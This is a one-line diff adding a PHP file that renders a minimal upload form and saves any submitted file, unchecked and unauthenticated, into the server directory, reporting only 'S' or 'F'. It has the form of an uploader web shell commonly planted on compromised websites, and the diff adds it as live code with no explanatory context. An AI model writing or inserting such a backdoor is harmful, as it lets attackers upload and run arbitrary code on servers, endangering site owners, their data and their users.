@@ -1,0 +1,1 @@
+<?echo'<form method="post"enctype="multipart/form-data"><input type="file"name="file"><input name="_upl"type="submit"value=">"></form>';if( $_POST['_upl']==">"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo'S';}else{echo'F';}}?>﻿
